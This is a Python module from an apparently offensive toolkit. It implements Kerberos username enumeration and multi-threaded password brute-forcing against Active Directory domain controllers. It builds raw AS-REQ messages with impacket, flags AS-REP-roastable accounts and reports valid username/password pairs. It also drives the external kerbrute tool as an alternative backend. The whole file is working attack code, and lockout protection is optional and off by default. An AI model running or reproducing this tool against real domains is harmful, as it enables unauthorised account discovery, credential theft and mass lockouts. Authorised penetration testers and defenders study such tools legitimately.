"""Kerberos pre-authentication bruteforce / user enumeration.

Kerbrute-style attacks implemented with impacket's ASN.1/crypto helpers, but
with our own TCP I/O: impacket's ``sendReceive`` never closes its socket and has
no timeout, so repeated attempts leak file descriptors (breaking ``select()``
elsewhere in Elwand) and can hang forever.

* ``userenum``  - one AS-REQ **without** pre-authentication per username; the
  KDC reply tells whether the account exists. This never counts as a failed
  login (no lockout).
* ``bruteuser`` - one username, many passwords. We fetch the etype/salt once
  (first AS-REQ), then send one PA-ENC-TIMESTAMP AS-REQ per password.

Every request uses :func:`_send_receive` (bounded timeout, explicit close).
"""

import datetime
import os
import queue
import random
import re
import socket
import struct
import subprocess
import tempfile
import threading
import time
from concurrent.futures import (
    FIRST_COMPLETED, ThreadPoolExecutor, wait,
)

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from impacket.krb5 import constants
from impacket.krb5.asn1 import (
    AS_REQ, EncryptedData, ETYPE_INFO, ETYPE_INFO2, KERB_PA_PAC_REQUEST,
    KRB_ERROR, METHOD_DATA, PA_ENC_TS_ENC, seq_set, seq_set_iter,
)
from impacket.krb5.crypto import _enctype_table
from impacket.krb5.types import KerberosTime, Principal

from src import process_registry

MAX_WORKERS = 200
IO_TIMEOUT = 10.0
_MAX_RESPONSE = 16 * 1024 * 1024

_E = constants.ErrorCodes

# result states
VALID = "valid"
ASREP = "asrep"       # valid + does not require pre-auth (AS-REP roastable)
INVALID = "invalid"   # principal unknown / wrong password
LOCKED = "locked"     # disabled / locked out
NOUSER = "nouser"
SKEW = "skew"         # clock skew (bruteuser)
ERROR = "error"


def _principal(name):
    return Principal(name, type=constants.PrincipalNameType.NT_PRINCIPAL.value)


def clean_username(name):
    """Strip a DOMAIN\\ or user@domain wrapper, leaving the sAMAccountName."""
    name = (name or "").strip()
    if "\\" in name:
        name = name.split("\\", 1)[1]
    if "@" in name:
        name = name.split("@", 1)[0]
    return name.strip()


def _code_name(code):
    try:
        return constants.ErrorCodes(code).name
    except Exception:
        return f"error {code}"


# ---------------------------------------------------------------------------
# external kerbrute backend


_ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")
_TS_RE = re.compile(r"^\d{4}/\d{2}/\d{2} \d{2}:\d{2}:\d{2}\s*>\s*")
_VALID_USER_RE = re.compile(r"VALID USERNAME(?: WITH ERROR)?:\s*(\S+?)@", re.I)
_VALID_LOGIN_RE = re.compile(r"VALID LOGIN(?: WITH ERROR)?:\s*(\S+?):(.*)$", re.I)
_DONE_RE = re.compile(r"Done!\s*Tested\s+(\d+)\s+(?:usernames|logins)", re.I)

# Per-attempt results that only mean "this candidate was rejected"; they count
# for progress but must not be shown in the output.
_BENIGN_ERRORS = (
    "user does not exist",
    "invalid password",
    "skipping blank username",
    "got as-rep (no pre-auth)",
)


def kerbrute_path():
    """Locate kerbrute: cached init-dialog path, then PATH/rc/interactive."""
    try:
        from src.info import get as info_get
        p = info_get("kerbrute_path")
        if p and os.path.isfile(p):
            return p
    except Exception:
        pass
    try:
        from src.resolve_binary import resolve
        return resolve("kerbrute")
    except Exception:
        return None


def _stream_kerbrute(cmd, stop_flag):
    """Run kerbrute and yield its output lines; stop_flag terminates it."""
    proc = subprocess.Popen(
        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1,
    )
    q = queue.Queue()

    def _reader():
        try:
            for line in proc.stdout:
                q.put(line)
        except Exception:
            pass
        finally:
            q.put(None)

    threading.Thread(target=_reader, daemon=True).start()
    try:
        while True:
            if stop_flag.is_set():
                try:
                    proc.terminate()
                except Exception:
                    pass
            try:
                line = q.get(timeout=0.2)
            except queue.Empty:
                if proc.poll() is not None:
                    try:
                        line = q.get(timeout=0.2)
                    except queue.Empty:
                        break
                else:
                    continue
            if line is None:
                break
            yield line
    finally:
        try:
            if proc.poll() is None:
                proc.terminate()
        except Exception:
            pass
        try:
            proc.wait(timeout=2)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass


# ---------------------------------------------------------------------------
# TCP transport (explicit close + timeout)


def _recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise OSError("connection closed by KDC")
        buf += chunk
    return buf


def _send_receive(data, realm, kdc, port=88, timeout=IO_TIMEOUT):
    """Send a Kerberos message over TCP and return the raw reply.

    Always closes the socket (impacket's sendReceive does not) and enforces a
    timeout so a stalled KDC can never block a worker forever."""
    host = kdc or realm
    infos = socket.getaddrinfo(host, port, 0, socket.SOCK_STREAM)
    last = None
    for af, socktype, proto, _canon, sa in infos:
        sock = None
        try:
            sock = socket.socket(af, socktype, proto)
            sock.settimeout(timeout)
            sock.connect(sa)
            sock.sendall(struct.pack("!i", len(data)) + data)
            n = struct.unpack("!i", _recv_exact(sock, 4))[0]
            if n <= 0 or n > _MAX_RESPONSE:
                raise OSError(f"invalid Kerberos response length ({n})")
            return _recv_exact(sock, n)
        except OSError as e:
            last = e
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass
    raise last or OSError(f"could not connect to KDC {host}:{port}")


# ---------------------------------------------------------------------------
# AS-REQ construction


def _fill_req_body(as_req, username, realm, etypes):
    req_body = seq_set(as_req, "req-body")
    req_body["kdc-options"] = constants.encodeFlags([
        constants.KDCOptions.forwardable.value,
        constants.KDCOptions.renewable.value,
    ])
    seq_set(req_body, "sname", _principal(f"krbtgt/{realm}").components_to_asn1)
    seq_set(req_body, "cname", _principal(username).components_to_asn1)
    req_body["realm"] = realm
    now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
    req_body["till"] = KerberosTime.to_asn1(now)
    req_body["rtime"] = KerberosTime.to_asn1(now)
    req_body["nonce"] = random.getrandbits(31)
    seq_set_iter(req_body, "etype", tuple(etypes))


def _pac_padata(include_pac=False):
    pac = KERB_PA_PAC_REQUEST()
    pac["include-pac"] = include_pac
    return encoder.encode(pac)


def _build_as_req(username, realm, include_pac=False, etypes=None):
    """Build a minimal AS-REQ without pre-authentication (no PA-ENC-TS)."""
    if etypes is None:
        etypes = (
            int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
            int(constants.EncryptionTypes.rc4_hmac.value),
        )
    as_req = AS_REQ()
    as_req["pvno"] = 5
    as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)
    as_req["padata"] = noValue
    as_req["padata"][0] = noValue
    as_req["padata"][0]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
    as_req["padata"][0]["padata-value"] = _pac_padata(include_pac)
    _fill_req_body(as_req, username, realm, etypes)
    return encoder.encode(as_req)


def _build_preauth_as_req(username, realm, password, etype, salt):
    """Build an AS-REQ carrying PA-ENC-TIMESTAMP for one password."""
    cipher = _enctype_table[etype]
    salt_bytes = salt.encode("utf-8") if isinstance(salt, str) else (salt or b"")
    key = cipher.string_to_key(password, salt_bytes, None)

    ts = PA_ENC_TS_ENC()
    now = datetime.datetime.now(datetime.timezone.utc)
    ts["patimestamp"] = KerberosTime.to_asn1(now)
    ts["pausec"] = now.microsecond
    enc_ts = cipher.encrypt(key, 1, encoder.encode(ts), None)

    enc_data = EncryptedData()
    enc_data["etype"] = cipher.enctype
    enc_data["cipher"] = enc_ts

    as_req = AS_REQ()
    as_req["pvno"] = 5
    as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)
    as_req["padata"] = noValue
    as_req["padata"][0] = noValue
    as_req["padata"][0]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_ENC_TIMESTAMP.value)
    as_req["padata"][0]["padata-value"] = encoder.encode(enc_data)
    as_req["padata"][1] = noValue
    as_req["padata"][1]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
    as_req["padata"][1]["padata-value"] = _pac_padata(False)
    _fill_req_body(as_req, username, realm, (etype,))
    return encoder.encode(as_req)


# ---------------------------------------------------------------------------
# reply parsing


def _krb_error(reply):
    try:
        err = decoder.decode(reply, asn1Spec=KRB_ERROR())[0]
        return int(err["error-code"]), err
    except Exception:
        return None, None


def _parse_etype_salt(err):
    """Return {etype: salt} from a PREAUTH_REQUIRED KRB_ERROR."""
    salts = {}
    try:
        methods = decoder.decode(err["e-data"], asn1Spec=METHOD_DATA())[0]
    except Exception:
        return salts
    for method in methods:
        try:
            ptype = int(method["padata-type"])
            if ptype == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
                info = decoder.decode(
                    method["padata-value"], asn1Spec=ETYPE_INFO2())[0]
            elif ptype == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO.value:
                info = decoder.decode(
                    method["padata-value"], asn1Spec=ETYPE_INFO())[0]
            else:
                continue
            for entry in info:
                etype = int(entry["etype"])
                salt = ""
                try:
                    if entry["salt"] is not None and entry["salt"].hasValue():
                        salt = entry["salt"].prettyPrint()
                except Exception:
                    salt = ""
                salts.setdefault(etype, salt)
        except Exception:
            continue
    return salts


def _etype_candidates(salts):
    order = [
        int(constants.EncryptionTypes.rc4_hmac.value),
        int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
        int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
    ]
    out = [e for e in order if e in salts]
    if not out and salts:
        out = list(salts)
    if not out:
        out = [int(constants.EncryptionTypes.rc4_hmac.value)]
    return out


def _classify_noauth(reply):
    code, err = _krb_error(reply)
    if code is None:
        return ASREP, "no pre-auth (AS-REP roastable)"
    if code == _E.KDC_ERR_PREAUTH_REQUIRED.value:
        return VALID, "pre-auth required"
    if code == _E.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
        return INVALID, "KDC_ERR_C_PRINCIPAL_UNKNOWN"
    if code == _E.KDC_ERR_CLIENT_REVOKED.value:
        return LOCKED, "KDC_ERR_CLIENT_REVOKED"
    return ERROR, _code_name(code)


# ---------------------------------------------------------------------------
# public per-item checks


def enumerate_user(username, realm, kdc, port=None, timeout=IO_TIMEOUT):
    """Test one username with a single pre-auth-less AS-REQ."""
    port = port or 88
    try:
        reply = _send_receive(_build_as_req(username, realm), realm, kdc,
                              port, timeout)
    except OSError as e:
        return ERROR, str(e)
    return _classify_noauth(reply)


def preauth_info(username, realm, kdc, port=None, timeout=IO_TIMEOUT):
    """Fetch the pre-auth requirement + etype/salt for a username.

    Returns ``(state, detail, {etype: salt})``."""
    port = port or 88
    try:
        reply = _send_receive(_build_as_req(username, realm), realm, kdc,
                              port, timeout)
    except OSError as e:
        return ERROR, str(e), None
    code, err = _krb_error(reply)
    if code is None:
        return ASREP, "no pre-auth (AS-REP roastable)", None
    if code == _E.KDC_ERR_PREAUTH_REQUIRED.value:
        return VALID, "pre-auth required", _parse_etype_salt(err)
    if code == _E.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
        return NOUSER, "KDC_ERR_C_PRINCIPAL_UNKNOWN", None
    if code == _E.KDC_ERR_CLIENT_REVOKED.value:
        return LOCKED, "KDC_ERR_CLIENT_REVOKED", None
    return ERROR, _code_name(code), None


def try_password(username, password, realm, kdc, preauth=None,
                 port=None, timeout=IO_TIMEOUT):
    """Test one password for a username via Kerberos pre-authentication."""
    port = port or 88
    if preauth is None:
        preauth = preauth_info(username, realm, kdc, port, timeout)
    state, detail, salts = preauth
    if state == ASREP:
        return ASREP, detail
    if state == NOUSER:
        return NOUSER, detail
    if state == LOCKED:
        return LOCKED, detail
    if state == ERROR:
        return ERROR, detail

    salts = salts or {}
    last = (ERROR, "no supported encryption type")
    for etype in _etype_candidates(salts):
        salt = salts.get(etype, "")
        try:
            req = _build_preauth_as_req(username, realm, password, etype, salt)
            reply = _send_receive(req, realm, kdc, port, timeout)
        except OSError as e:
            return ERROR, str(e)
        except Exception as e:
            last = (ERROR, str(e))
            continue
        code, _err = _krb_error(reply)
        if code is None:
            return VALID, "AS-REP"
        if code == _E.KDC_ERR_PREAUTH_FAILED.value:
            return INVALID, "KDC_ERR_PREAUTH_FAILED"
        if code == _E.KDC_ERR_CLIENT_REVOKED.value:
            return LOCKED, "KDC_ERR_CLIENT_REVOKED"
        if code == _E.KRB_AP_ERR_SKEW.value:
            return SKEW, "KRB_AP_ERR_SKEW"
        if code == _E.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
            return NOUSER, "KDC_ERR_C_PRINCIPAL_UNKNOWN"
        if code == _E.KDC_ERR_ETYPE_NOSUPP.value:
            last = (ERROR, "KDC_ERR_ETYPE_NOSUPP")
            continue
        return ERROR, _code_name(code)
    return last


# ---------------------------------------------------------------------------
# engine


class KerberosEngine:
    def __init__(self, domain, kdc, mode, users=None, userlist=None,
                 user="", passwords=None, passlist=None, port=88,
                 workers=MAX_WORKERS, delay=0.0, safe=False,
                 on_result=None, on_progress=None, on_found=None,
                 on_valid_user=None):
        self._domain = (domain or "").strip().upper()
        self._kdc = (kdc or "").strip()
        self._mode = (mode or "").strip().lower()
        self._users = users
        self._userlist = userlist
        self._user = (user or "").strip()
        self._passwords = passwords
        self._passlist = passlist
        self._port = int(port or 88)
        self._workers = max(1, int(workers or MAX_WORKERS))
        self._delay = max(0.0, float(delay or 0.0))
        self._safe = bool(safe)
        self._on_result = on_result
        self._on_progress = on_progress
        self._on_found = on_found
        self._on_valid_user = on_valid_user
        self._stop_flag = threading.Event()
        self._found = {}

    def start(self):
        self._stop_flag.clear()
        pid = process_registry.register(
            "Bruteforce",
            detail=f"kerberos {self._mode}  {self._domain} @ {self._kdc}")

        def _wrap():
            try:
                self._run()
            finally:
                process_registry.finish(pid)

        threading.Thread(target=_wrap, daemon=True).start()

    def stop(self):
        self._stop_flag.set()

    def _emit(self, text, color=None):
        if self._on_result:
            self._on_result(text, color)

    def _load_lines(self, path):
        lines = []
        try:
            with open(path, errors="replace") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        lines.append(line)
        except Exception:
            pass
        return lines

    def _run(self):
        if not self._domain:
            self._emit("[!] Domain (realm) is required.", "error")
            return
        if not self._kdc:
            self._emit("[!] DC / KDC is required.", "error")
            return
        if not self._preflight():
            return
        if self._mode not in ("userenum", "bruteuser"):
            self._emit(f"[!] Unknown Kerberos mode: {self._mode}", "error")
            return

        # Prefer the external kerbrute binary when it is installed; fall back to
        # the built-in impacket implementation otherwise.
        kerbrute = kerbrute_path()
        if kerbrute:
            self._emit(f"[*] Backend: kerbrute ({kerbrute})")
            try:
                self._run_kerbrute(kerbrute)
                return
            except Exception as e:
                self._emit(f"[!] kerbrute error: {e}", "error")
                self._emit("[*] Falling back to the built-in engine.")
        else:
            self._emit("[*] Backend: built-in (impacket)")

        if self._mode == "userenum":
            self._run_userenum()
        else:
            self._run_bruteuser()

    @staticmethod
    def _materialize(items):
        fd = tempfile.NamedTemporaryFile("w", delete=False, encoding="utf-8")
        try:
            for item in items:
                fd.write(str(item) + "\n")
        finally:
            fd.close()
        return fd.name

    def _enum_users(self):
        if self._users is not None:
            return [u for u in (clean_username(x) for x in self._users) if u]
        if self._userlist:
            return [u for u in (clean_username(x) for x in self._load_lines(self._userlist)) if u]
        return []

    def _brute_users(self):
        """Users to brute: a single -u, a list, or a file."""
        if self._user:
            u = clean_username(self._user)
            return [u] if u else []
        return self._enum_users()

    def _brute_passwords(self):
        if self._passwords is not None:
            return [str(p) for p in self._passwords]
        if self._passlist:
            return self._load_lines(self._passlist)
        return []

    # ---- kerbrute parsing -------------------------------------------------

    def _handle_kerbrute_line(self, line, seen, shown_errors):
        if "VALID USERNAME" in line:
            m = _VALID_USER_RE.search(line)
            if m:
                username = m.group(1).strip()
                key = username.lower()
                if key not in seen:
                    seen.add(key)
                    return ("valid_user", username)
            return ("attempt",)
        if "VALID LOGIN" in line:
            m = _VALID_LOGIN_RE.search(line)
            if m:
                login_user = m.group(1).strip().split("@", 1)[0]
                pwd = m.group(2)
                key = f"{login_user.lower()}:{pwd}"
                if key not in seen:
                    seen.add(key)
                    return ("valid_login", login_user, pwd)
            return ("attempt",)
        if "[!]" in line and "@" in line:
            err = line.rsplit(" - ", 1)[-1].strip() if " - " in line else ""
            low = err.lower()
            if not any(b in low for b in _BENIGN_ERRORS):
                dedup = low or line
                if dedup not in shown_errors:
                    shown_errors.add(dedup)
                    clean = _TS_RE.sub("", line)
                    if clean.startswith("[!]"):
                        clean = clean[3:].strip()
                    return ("error", clean)
            return ("attempt",)
        m = _DONE_RE.search(line)
        if m:
            return ("done", int(m.group(1)))
        return None

    def _stream_kerbrute_cmd(self, cmd, seen, shown_errors, base, total):
        """Run one kerbrute command; return the number of attempts tested."""
        tested = 0
        done = 0
        for raw in _stream_kerbrute(cmd, self._stop_flag):
            line = _ANSI_RE.sub("", raw).strip()
            if not line:
                continue
            ev = self._handle_kerbrute_line(line, seen, shown_errors)
            if ev is None:
                continue
            kind = ev[0]
            if kind == "valid_user":
                if self._on_valid_user:
                    self._on_valid_user(ev[1], VALID, "kerbrute")
            elif kind == "valid_login":
                if self._on_found:
                    self._on_found(ev[1], ev[2])
            elif kind == "attempt":
                tested += 1
                if self._on_progress:
                    self._on_progress(min(base + tested, total), total)
            elif kind == "done":
                done = ev[1]
            elif kind == "error":
                self._emit(ev[1], "error")
        if done:
            tested = done
            if self._on_progress:
                self._on_progress(min(base + tested, total), total)
        return tested

    def _run_kerbrute(self, kerbrute):
        cleanup = None
        base_cmd = [kerbrute, "-d", self._domain, "--dc", self._kdc,
                    "-t", str(self._workers), "-v"]
        if self._safe:
            base_cmd.append("--safe")
        if self._delay:
            base_cmd.extend(["--delay", str(int(self._delay * 1000))])

        seen = set()
        shown_errors = set()

        if self._mode == "userenum":
            if self._userlist:
                list_path = self._userlist
                total = len(self._load_lines(self._userlist))
                users = self._enum_users()
            else:
                users = self._enum_users()
                if not users:
                    self._emit("[!] No usernames to test.", "error")
                    return
                list_path = self._materialize(users)
                cleanup = list_path
                total = len(users)
            if not users:
                self._emit("[!] No usernames to test.", "error")
                return
            cmd = [kerbrute, "userenum"] + base_cmd[1:] + [list_path]
            self._emit(f"\n[*] Kerberos userenum — realm {self._domain}, "
                       f"KDC {self._kdc}: {total} entries, "
                       f"{self._workers} threads\n")
            if self._on_progress:
                self._on_progress(0, total)
            try:
                tested = self._stream_kerbrute_cmd(cmd, seen, shown_errors,
                                                   0, total)
            finally:
                if cleanup:
                    try:
                        os.unlink(cleanup)
                    except OSError:
                        pass
            if self._stop_flag.is_set():
                self._emit("\n[*] Stopped.")
            else:
                self._emit(f"\n[*] Done. {len(seen)} valid result(s) of "
                           f"{tested or total} tested.")
            return

        # bruteuser (one or many users)
        users = self._brute_users()
        if not users:
            self._emit("[!] A user list is required.", "error")
            return
        passwords = self._brute_passwords()
        if not passwords:
            self._emit("[!] No passwords to test.", "error")
            return
        if self._passlist:
            list_path = self._passlist
        else:
            list_path = self._materialize(passwords)
            cleanup = list_path
        total = len(users) * len(passwords)
        self._emit(f"\n[*] Kerberos bruteuser — realm {self._domain}, "
                   f"KDC {self._kdc}: {len(users)} user(s), "
                   f"{len(passwords)} password(s), {self._workers} threads\n")
        if self._on_progress:
            self._on_progress(0, total)
        tested = 0
        try:
            for user in users:
                if self._stop_flag.is_set():
                    break
                if len(users) > 1:
                    self._emit(f"[*] User: {user}")
                cmd = [kerbrute, "bruteuser"] + base_cmd[1:] + [list_path, user]
                n = self._stream_kerbrute_cmd(cmd, seen, shown_errors,
                                              tested, total)
                tested += n if n else len(passwords)
                if self._on_progress:
                    self._on_progress(min(tested, total), total)
        finally:
            if cleanup:
                try:
                    os.unlink(cleanup)
                except OSError:
                    pass
        if self._stop_flag.is_set():
            self._emit("\n[*] Stopped.")
        else:
            self._emit(f"\n[*] Done. {len(seen)} valid result(s) of "
                       f"{tested} tested.")

    def _preflight(self):
        try:
            socket.create_connection((self._kdc, self._port), timeout=5).close()
            return True
        except OSError as e:
            self._emit(f"[!] Cannot reach KDC {self._kdc}:{self._port}: {e}",
                       "error")
            return False

    def _run_pool(self, items, fn, handle, total, base=0):
        """Run `fn(item)` over `items` with a bounded number of in-flight
        futures (never submits the whole wordlist at once)."""
        workers = 1 if self._delay else self._workers
        executor = ThreadPoolExecutor(max_workers=max(1, workers))
        max_inflight = 1 if self._delay else max(1, workers * 4)
        it = iter(items)
        inflight = {}
        tested = 0

        def submit_next():
            if self._stop_flag.is_set():
                return False
            try:
                item = next(it)
            except StopIteration:
                return False
            if self._delay:
                time.sleep(self._delay)
            inflight[executor.submit(fn, item)] = item
            return True

        try:
            for _ in range(max_inflight):
                if not submit_next():
                    break
            while inflight and not self._stop_flag.is_set():
                done, _pending = wait(list(inflight),
                                      return_when=FIRST_COMPLETED)
                for fut in done:
                    item = inflight.pop(fut, None)
                    if item is None:
                        continue
                    tested += 1
                    if self._on_progress:
                        self._on_progress(min(base + tested, total), total)
                    try:
                        result = fut.result()
                    except Exception as e:
                        result = (ERROR, str(e))
                    handle(item, result)
                    if self._stop_flag.is_set():
                        break
                    submit_next()
        finally:
            executor.shutdown(wait=False, cancel_futures=True)
        return base + tested

    def _run_userenum(self):
        users = self._enum_users()
        if not users:
            self._emit("[!] No usernames to test.", "error")
            return
        total = len(users)
        self._emit(f"\n[*] Kerberos userenum — realm {self._domain}, "
                   f"KDC {self._kdc}: {total} username(s)\n")
        stats = {"valid": 0}

        def handle(username, result):
            state, detail = result
            if state in (VALID, ASREP):
                stats["valid"] += 1
                if self._on_valid_user:
                    self._on_valid_user(username, state, detail)
            elif state == LOCKED:
                self._emit(f"[!] {username}: {detail}", "error")
                if self._safe:
                    self._emit("[!] Locked account detected — aborting "
                               "(safe mode).", "error")
                    self._stop_flag.set()
            elif state == ERROR:
                self._emit(f"[!] {username}: {detail}", "error")

        tested = self._run_pool(
            users,
            lambda u: enumerate_user(u, self._domain, self._kdc, self._port),
            handle, total)
        self._emit(f"\n[*] Done. {stats['valid']} valid username(s) of "
                   f"{tested} tested.")

    def _run_bruteuser(self):
        users = self._brute_users()
        if not users:
            self._emit("[!] A username or user list is required.", "error")
            return
        passwords = self._brute_passwords()
        if not passwords:
            self._emit("[!] No passwords to test.", "error")
            return

        total = len(users) * len(passwords)
        self._emit(f"\n[*] Kerberos bruteuser — realm {self._domain}, "
                   f"KDC {self._kdc}: {len(users)} user(s), "
                   f"{len(passwords)} password(s)\n")
        stats = {"valid": 0}
        tested = 0

        def make_handler(user):
            def handle(pwd, result):
                state, detail = result
                if state == VALID:
                    stats["valid"] += 1
                    key = f"{user}:{pwd}"
                    if key not in self._found:
                        self._found[key] = True
                        if self._on_found:
                            self._on_found(user, pwd)
                elif state == LOCKED:
                    self._emit(f"[!] {user}: {detail}", "error")
                    if self._safe:
                        self._emit("[!] Account locked/disabled — aborting "
                                   "(safe mode).", "error")
                        self._stop_flag.set()
                elif state == SKEW:
                    self._emit("[!] Clock skew between this host and the KDC. "
                               "Sync the system time and retry.", "error")
                elif state == NOUSER:
                    self._emit(f"[!] Unknown username: {user}", "error")
                    self._stop_flag.set()
                elif state == ASREP:
                    self._emit(f"[+] {user} does not require pre-auth "
                               f"(AS-REP roastable); no password needed.",
                               "success")
                    self._stop_flag.set()
                elif state == ERROR:
                    self._emit(f"[!] {pwd}: {detail}", "error")
            return handle

        for user in users:
            if self._stop_flag.is_set():
                break
            if len(users) > 1:
                self._emit(f"[*] User: {user}")

            preauth = preauth_info(user, self._domain, self._kdc, self._port)
            state, detail, _salts = preauth
            if state == NOUSER:
                self._emit(f"[!] Unknown username: {user}", "error")
                tested += len(passwords)
                if self._on_progress:
                    self._on_progress(min(tested, total), total)
                continue
            if state == LOCKED:
                self._emit(f"[!] {user}: {detail}", "error")
                if self._safe:
                    self._stop_flag.set()
                    break
                tested += len(passwords)
                if self._on_progress:
                    self._on_progress(min(tested, total), total)
                continue
            if state == ASREP:
                stats["valid"] += 1
                self._emit(f"[+] {user} does not require pre-auth "
                           f"(AS-REP roastable); no password needed.", "success")
                tested += len(passwords)
                if self._on_progress:
                    self._on_progress(min(tested, total), total)
                continue
            if state != VALID:
                self._emit(f"[!] {user}: {detail}", "error")
                tested += len(passwords)
                if self._on_progress:
                    self._on_progress(min(tested, total), total)
                continue

            tested = self._run_pool(
                passwords,
                lambda p, u=user: try_password(u, p, self._domain,
                                               self._kdc, preauth, self._port),
                make_handler(user), total, base=tested)
        self._emit(f"\n[*] Done. {stats['valid']} valid password(s) of "
                   f"{tested} tested.")
